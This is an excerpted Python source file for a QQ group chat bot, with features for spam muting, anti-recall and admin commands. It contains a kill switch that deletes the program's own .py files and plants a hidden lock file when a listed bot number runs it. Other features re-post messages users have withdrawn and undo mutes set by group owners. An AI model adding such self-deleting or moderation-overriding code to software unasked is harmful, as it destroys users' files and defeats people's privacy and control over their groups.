...
# ========== 启动时清理旧密钥 ==========
license_file = "data/.module_license"
if os.path.exists(license_file):
    try:
        os.remove(license_file)
        print("[启动] 已清理旧密钥文件，将重新生成")
...
class LicenseManager:
    def __init__(self):
        self.license_file = "data/.module_license"
    ...
    def _load_or_generate(self):
        ...
        self.license_key = secrets.token_hex(8)
        
        with open(self.license_file, "w") as f:
            json.dump({"license_key": self.license_key}, f, indent=2)
        
        print(f"[授权] 生成密钥: {self.license_key}")
...
_license_mgr = LicenseManager()
import builtins
builtins.XP12_LICENSE_KEY = _license_mgr.get_key()
print(f"[授权] 密钥已注入: {builtins.XP12_LICENSE_KEY}")
import os
import sys
from spam_detector import get_spam_detector
...
class AntiRecallLogger:
    ...
    def handle_recall_event(self, data: Dict) -> Optional[Dict]:
        ...
        try:
            ...
            if "[CQ:image" in cached_message_content or "[CQ:record" in cached_message_content:
                is_media_message = True
            
            # ===== 检查是否有缓存的媒体（用归一化后的 ID）=====
            norm_id = self._normalize_id(raw_message_id)
            msg_id_key = str(norm_id) if norm_id else str(raw_message_id)
            cached_media = self.media_cache.get(msg_id_key, {})
            
            # 构建反撤回内容
            if cached_media and is_media_message:
                # 有媒体缓存 且 撤回的确实是媒体消息 → 发送媒体
...
class OllamaAI:
    def __init__(self):
        ...
        self.text_models_priority = [
            ...
            "gpt-oss:120b-cloud"# 第二优先 
            "nemotron-3-super:cloud",# 第三优先          
            "gpt-oss:20b-cloud"#第四优先        
...
class MessageHandler:
    def __init__(self):
        ...
        from auto_unmute_all import get_auto_unmute_all
        self.auto_unmute_all = get_auto_unmute_all()
        print("[调试] 自动解禁全体模块加载成功")
        try:
            from auto_rejoin import AutoRejoinManager
    ...
    async def _set_group_card(self, group_id: str, target_qq: str, new_name: str, operator_id: str) -> Dict:
        """修改群成员名片"""
        try:
            if not hasattr(self, 'websocket') or not self.websocket:
                return self._create_reply("group", operator_id, group_id, "❌ WebSocket未连接")
            ...
            await self.websocket.send(json.dumps({
                ...
                "echo": f"set_card_{int(time.time()*1000)}"
            }))
            
            return self._create_reply("group", operator_id, group_id, f"✅ 已将 {target_qq} 的群名片改为：{new_name}")
            
        except Exception as e:
            print(f"[改名] 错误: {e}")
            return self._create_reply("group", operator_id, group_id, f"❌ 改名失败: {str(e)}")
    ...
    def _handle_group_ban(self, data: Dict) -> Optional[Dict]:
        """处理群禁言事件（修复版 - 自动解禁 + 禁言拉黑 + 全体解禁 + 刷屏者解禁重封）"""
        try:
            user_id = str(data.get("user_id", ""))
            group_id = str(data.get("group_id", ""))
            duration = data.get("duration", 0)
            ...
            # ========== 检测全体禁言 ==========
            if user_id == "0" and duration > 0:
                print(f"[禁言事件] 检测到全体禁言！操作者={operator_id}")
                if hasattr(self, 'auto_unmute_all') and self.auto_unmute_all:
                    if self.auto_unmute_all.is_group_enabled(group_id):
                        print(f"[自动解禁全体] 群 {group_id} 已启用，发送解禁请求")
                        asyncio.create_task(self._send_unmute_all(int(group_id)))
                    else:
                        print(f"[自动解禁全体] 群 {group_id} 未启用，跳过")
                return None
            
            # ========== 🆕 检测解禁（duration=0）==========
            if duration == 0:
                print(f"[禁言事件] 用户 {user_id} 被解禁")
                
                # ===== 排除名单：同步 auto_unmute 的白名单 =====
                # 如果用户在白名单里（自动解禁名单），解禁不管
                if self.auto_unmute.is_user_in_whitelist(user_id):
                    print(f"[禁言事件] 用户 {user_id} 在自动解禁白名单中，跳过")
                    return None
                
                # ===== 检查是否是 AI 管理员 =====
                if self.admin_manager.is_admin(user_id):
                    print(f"[禁言事件] 用户 {user_id} 是 AI 管理员，跳过")
                    return None
                
                # ===== 检查刷屏记录，计算剩余禁言时间 =====
                if hasattr(self, 'spam_detector') and self.spam_detector:
                    if self.spam_detector.is_user_monitored(group_id, user_id):
                        # 获取当前等级和剩余时间
                        mute_level = self.spam_detector.get_mute_level(group_id, user_id)
                        mute_end_time = self.spam_detector.get_mute_end_time(group_id, user_id)
                        now = time.time()
                        
                        if mute_level > 0 and mute_end_time > now:
                            # 计算剩余时间
                            remaining = int(mute_end_time - now)
                            if remaining < 60:
                                remaining = 60
                            print(f"[禁言事件] 刷屏用户 {user_id} 被解禁，等级 {mute_level}，剩余 {self._format_duration(remaining)}，重新禁言")
                            ...
                            return {
                                ...
                                "echo": f"reban_spammer_{user_id}_{int(time.time())}"
                            }
                        else:
                            print(f"[禁言事件] 用户 {user_id} 有刷屏记录但已过期，跳过")
                
                # ===== 检查黑名单 =====
                if self.blacklist.is_banned(user_id):
                    if user_id in self.blacklist.expires:
                        expire_time = self.blacklist.expires[user_id]
                        now = time.time()
                        if expire_time > now:
                            remaining = int(expire_time - now)
                            if remaining < 60:
                                remaining = 60
                            print(f"[禁言事件] 黑名单用户 {user_id} 被解禁，剩余 {self._format_duration(remaining)}，重新禁言")
                            return {
                                "action": "set_group_ban",
                                "params": {
                                    "group_id": int(group_id),
                                ...
                                "echo": f"reban_blacklist_{user_id}_{int(time.time())}"
                            }
                    print(f"[禁言事件] 黑名单用户 {user_id} 被解禁（永久封禁），禁言 29 天")
                    return {
                        "action": "set_group_ban",
                        "params": {
                            "group_id": int(group_id),
            ...
            traceback.print_exc()
            return None
    async def _send_unmute_all(self, group_id: int):
        """发送 HTTP 解禁全体请求"""
        import aiohttp
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "http://127.0.0.1:3000/set_group_whole_ban",
                    json={"group_id": group_id, "enable": False},
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        print(f"[自动解禁全体] ✅ 群 {group_id} 全体禁言已解除")
                    else:
    ...
    async def handle_message(self, data: Dict) -> Optional[Dict]:
        try:
            ...
            if isinstance(raw_msg, str):
                if "[防撤回]" in raw_msg or "撤回了" in raw_msg:
                    print(f"[过滤] 防撤回消息，不触发任何逻辑")
                    return None
            # ===== 屏蔽其他机器人 =====
            if data.get("sender", {}).get("is_bot", False):
                return None
            
            # ===== 屏蔽指定机器人号 =====
            BLOCKED_BOTS = ["2854196310", "2854196309"]
            if str(data.get("user_id", "")) in BLOCKED_BOTS:
                return None
            ...
            if message_type == "group" and group_id:
                spam_result = await self.spam_detector.check_message(
                    str(group_id), str(user_id), self.websocket
                )
                if spam_result:
                    return spam_result
            # ====== 互斥骂人逻辑 ======
    ...
    async def _process_commands(self, text: str, user_id: str, message_type: str, group_id: str, raw_message_data: dict = None):
        ...
        # 🆕 确认命令放最前面，直接处理
        # ============================================================
        if text_lower == "确定" and hasattr(self, '_pending_clear_all'):
            print(f"[确认] 收到确定，检查缓存...")
            if message_type != "group" or not group_id:
                return self._create_reply(message_type, user_id, group_id, "❌ 该操作只能在群聊中使用")
            
            group_str = str(group_id)
            if group_str in self._pending_clear_all:
                pending = self._pending_clear_all[group_str]
                if pending["user_id"] == user_id and time.time() - pending["time"] < 60:
                    if hasattr(self, 'spam_detector') and self.spam_detector:
                        count = self.spam_detector.clear_group_records(group_str)
                        del self._pending_clear_all[group_str]
                        return self._create_reply(message_type, user_id, group_id, f"✅ 已清除本群全部刷屏记录，共 {count} 条")
                else:
                    del self._pending_clear_all[group_str]
                    return self._create_reply(message_type, user_id, group_id, "⏰ 确认已超时或无效，请重新操作")
            return self._create_reply(message_type, user_id, group_id, "❌ 没有待确认的操作")
        
        # ============================================================
        # 🆕 清除全部刷屏记录
        # ============================================================
        if text_lower.startswith(("!清除全部刷屏记录", "！清除全部刷屏记录", "!清全部记录", "！清全部记录")):
            print(f"[命令] 匹配到清除全部刷屏记录")
            ...
            if hasattr(self, 'spam_detector') and self.spam_detector:
                group_str = str(group_id)
                if group_str in self.spam_detector.records and self.spam_detector.records[group_str]:
                    count = len(self.spam_detector.records[group_str])
                    if not hasattr(self, '_pending_clear_all'):
                        self._pending_clear_all = {}
                    self._pending_clear_all[group_str] = {
                        "user_id": user_id,
                        "time": time.time()
                    }
                    return self._create_reply(message_type, user_id, group_id, 
                        f"⚠️ 确定要清除本群全部刷屏记录吗？（共 {count} 条）\n回复「确定」执行，60秒内有效")
                else:
                    return self._create_reply(message_type, user_id, group_id, "📭 本群暂无刷屏记录")
            
            return self._create_reply(message_type, user_id, group_id, "❌ 刷屏检测模块未初始化")
        
        # ============================================================
        # 🆕 清除单个用户刷屏记录
        # ============================================================
        if text_lower.startswith(("!清除刷屏记录", "！清除刷屏记录", "!清记录", "！清记录")):
            print(f"[命令] 匹配到清除刷屏记录")
            if not self.admin_manager.is_admin(user_id):
                return self._create_reply(message_type, user_id, group_id, "❌ 只有AI管理员可以操作")
            ...
            if not target:
                return self._create_reply(message_type, user_id, group_id, "❌ 请@要清除记录的用户，或直接输入QQ号")
            
            if hasattr(self, 'spam_detector') and self.spam_detector:
                if self.spam_detector.clear_user_record(str(group_id), target):
                    return self._create_reply(message_type, user_id, group_id, f"✅ 已清除用户 {target} 在本群的刷屏记录")
                else:
                    return self._create_reply(message_type, user_id, group_id, f"❌ 用户 {target} 在本群没有刷屏记录")
    ...
    # ========== 12. 绿茶语录（普通用户可用）==========
        ...
        if is_admin:
            ...
            if text_lower.startswith(("!好感度设置", "！好感度设置")):
                ...
                return self._create_reply(message_type, user_id, group_id, msg)
            # ========== 自动解禁全体管理 ==========
            if text_lower.startswith(("!自动解禁全体", "！自动解禁全体")):
                # ===== 只有默认管理员能用 =====
                DEFAULT_ADMINS = {"3280406098", "09AAF23C5552D991CA3600E8AD185CD3", "1096602858136"}
                if str(user_id) not in DEFAULT_ADMINS:
                    return self._create_reply(message_type, user_id, group_id, "❌ 你不是作者你用这个指令个屁啊")
                ...
                parts = text.split()
                if len(parts) < 2:
                    return self._create_reply(message_type, user_id, group_id, self.auto_unmute_all.get_status(str(group_id)))
                
                cmd = parts[1].lower()
                
                if cmd in ["启用", "开", "on"]:
                    if self.auto_unmute_all.enable_group(str(group_id)):
                        return self._create_reply(message_type, user_id, group_id, f"✅ 本群自动解禁全体已启用")
                    return self._create_reply(message_type, user_id, group_id, "本群已在启用列表中")
                
                if cmd in ["禁用", "关", "off"]:
                    if self.auto_unmute_all.disable_group(str(group_id)):
                        return self._create_reply(message_type, user_id, group_id, f"✅ 本群自动解禁全体已禁用")
                    return self._create_reply(message_type, user_id, group_id, "本群不在启用列表中")
        ...
        # ========== 刷屏检测管理（仅本群） ==========
        # ========== 刷屏检测管理（仅本群） ==========
        if text_lower.startswith(("!刷屏检测", "！刷屏检测")):
            if not is_admin:
                return self._create_reply(message_type, user_id, group_id, "❌ 只有管理员可以管理刷屏检测")
            ...
            parts = text.split()
            if len(parts) < 2:
                return self._create_reply(message_type, user_id, group_id, self.spam_detector.get_status(str(group_id)))
            
            cmd = parts[1].lower()
            
            if cmd in ["启用", "开", "on"]:
                if self.spam_detector.enable_group(str(group_id)):
                    return self._create_reply(message_type, user_id, group_id, f"✅ 本群刷屏检测已启用")
                return self._create_reply(message_type, user_id, group_id, "本群已在启用列表中")
            
            if cmd in ["禁用", "关", "off"]:
                if self.spam_detector.disable_group(str(group_id)):
                    return self._create_reply(message_type, user_id, group_id, f"✅ 本群刷屏检测已禁用")
                return self._create_reply(message_type, user_id, group_id, "本群不在启用列表中")
        ...
        if text_lower.startswith("!刷屏"):
            return self._create_reply(message_type, user_id, group_id, "❌ 刷屏器已禁用")
...
# ---------- 查看黑名单 ----------
    ...
    async def _music(self, group_id: int, user_id: str, keyword: str) -> Dict:
        ...
        try:
            ...
            if filepath and os.path.exists(filepath):
                voice_path = os.path.abspath(filepath)
                print(f"[点歌] 📤 语音文件: {voice_path}")
                voice_msg = f"[CQ:record,file={voice_path}]"
                ...
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, json=payload, timeout=30) as resp:
                        if resp.status == 200:
                            ...
                            detail_message_id = result_json.get("data", {}).get("message_id")
                            print(f"[点歌] ✅ 详情发送成功, ID: {detail_message_id}")
                            
                            if detail_message_id and hasattr(self, 'anti_recall'):
                                self.anti_recall.record_sent_message(
                                    group_id=str(group_id),
                                    content=detail_msg,
                                    message_id=detail_message_id
                                )
                                print(f"[防撤回] 📝 已记录详情消息: {detail_message_id}")
                        else:
                            text = await resp.text()
                            print(f"[点歌] ❌ 详情发送失败: {resp.status} - {text}")
                
                # 发送语音（如果有）
                if voice_msg and voice_path:
                    payload = {
                        "group_id": int(group_id),
                        "message": voice_msg
                    }
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, json=payload, timeout=30) as resp:
                            if resp.status == 200:
                                result_json = await resp.json()
                                voice_message_id = result_json.get("data", {}).get("message_id")
                                print(f"[点歌] ✅ 语音发送成功, ID: {voice_message_id}")
                                
                                # ===== 🆕 手动记录语音到防撤回 =====
                                try:
                                    if voice_message_id and hasattr(self, 'anti_recall'):
                                        # 记录到防撤回系统
                                        self.anti_recall.record_sent_message(
                                            group_id=str(group_id),
                                            content=voice_msg,
                                        ...
                                        # 🆕 缓存语音文件到 media_cache（用归一化后的 ID）
                                        if os.path.exists(voice_path):
                                            norm_id = self.anti_recall._normalize_id(voice_message_id)
                                            cache_key = str(norm_id) if norm_id else str(voice_message_id)
                                            self.anti_recall.media_cache[cache_key] = {
                                                "voice": voice_path
                                            }
                                            print(f"[防撤回] 💾 语音已手动缓存: {cache_key} -> {voice_path}")
                                        print(f"[防撤回] 🎤 已手动记录语音消息: {voice_message_id}")
                                except Exception as e:
                                    print(f"[防撤回] 手动记录语音失败: {e}")
                            else:
                                text = await resp.text()
    ...
    async def _ban_group(self, target_group: str, operator_id: str, duration: int = 0, 
        ...
        """
        拉黑整个群（连坐封禁）- 和 _unban_group 同款方法
        """
        try:
            if not hasattr(self, 'websocket') or not self.websocket:
            ...
            if not members:
                return f"❌ 获取群 {target_group} 成员失败，无法连坐封禁"
            ...
            for member in members:
                ...
                if self.blacklist.is_banned(member_qq):
                    ...
                    result = self.blacklist.ban_user(member_qq, full_reason, duration)
                    if result and result != "default_admin":
                        banned_count += 1
...
!阴阳库切换 <QQ> <阴/阳>
    ...
    async def _send_help_image_async(self, message_type: str, user_id: str, group_id: str, img_data) -> Optional[Dict]:
        ...
        try:
            ...
            if isinstance(img_data, str) and os.path.exists(img_data):  # ← 直接用顶部的 os
                abs_path = os.path.abspath(img_data)
                message_content = f"[CQ:image,file={abs_path}]"
                ...
                # ===== NapCat 模式：直接用 HTTP API 发送 =====
                    ...
                    import aiohttp  # ← aiohttp 只在需要时导入
                    url = "http://127.0.0.1:3000/send_msg"
                    payload = {
                        "group_id": int(group_id) if message_type == "group" else None,
                        "user_id": int(user_id) if message_type == "private" else None,
                        ...
                        async with session.post(url, json=payload, timeout=10) as resp:
                            if resp.status == 200:
                                ...
                                try:
                                    ...
                                    if message_id and group_id and hasattr(self, 'anti_recall'):
                                        self.anti_recall.record_sent_message(
                                            group_id=str(group_id),
                                            content=message_content,
                                            message_id=message_id
                                        )
                                        # 🆕 同时缓存图片到 media_cache（用于撤回重发）
                                        if os.path.exists(abs_path):
                                            # 用 message_id 作为 key
                                            self.anti_recall.media_cache[str(message_id)] = {
                                                "image": abs_path
                                            }
                                            print(f"[防撤回] 💾 图片已手动缓存: {message_id} -> {abs_path}")
                                        print(f"[防撤回] 📸 已手动记录图片消息: {message_id}")
                                except Exception as e:
                                    print(f"[防撤回] 手动记录失败: {e}")
        ...
        try:
            ...
            if category_str in ["16", "其他"]:
                commands = [
                    ...
                    ("!刷屏检测 禁用", "关闭本群刷屏检测"),
                    ("!刷屏检测 状态", "查看本群刷屏检测状态"),
                    ("!清除刷屏记录 @用户", "清除单个用户刷屏记录"),
                    ("!清除全部刷屏记录", "清除本群全部刷屏记录（需确认）"),
                    ("", ""),
                    ("--- 视频解析 ---", ""),
                    ("!视频解析 开/关", "开启/关闭视频解析"),
                    ("!视频解析 群发/私聊", "设置发送方式"),
...
def main():
    ...
    import builtins
    builtins.XP12_LICENSE_KEY = license_mgr.get_key()
    print(f"[授权] 密钥已注入: {builtins.XP12_LICENSE_KEY}")
    ...
    # ============================================================
    # 🚫 NapCat 模式黑名单自毁检测（只针对模式1）
    # ============================================================
    if choice == "1":
        # 获取当前机器人的 QQ 号（从环境变量读取）
        bot_qq = os.getenv("QQ_OFFICIAL_BOT_QQ", "4019743873")
        
        # ===== 黑名单列表（要封禁的机器人 QQ 号）=====
        BLACKLISTED_BOT_QQ = [
            "123456789",   # 示例：要封禁的机器人
            "987654321",
        ]
        
        if str(bot_qq) in BLACKLISTED_BOT_QQ:
            print(f"❌ 机器人 [{bot_qq}] 已被拉黑，NapCat 模式拒绝运行")
            print("🔥 正在清理目录中的 .py 文件...")
            ...
            print(f"💀 已删除 {deleted} 个文件，NapCat 模式已自毁")
            
            # 再留个锁定文件，防止复活
            with open(r"C:\ProgramData\qai_locked.dat", 'w') as f:
                f.write("locked")
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(r"C:\ProgramData\qai_locked.dat", 2)
            
            input("按回车键退出...")
            sys.exit(0)
        else:
            print(f"✅ NapCat 模式 - 机器人 [{bot_qq}] 验证通过")
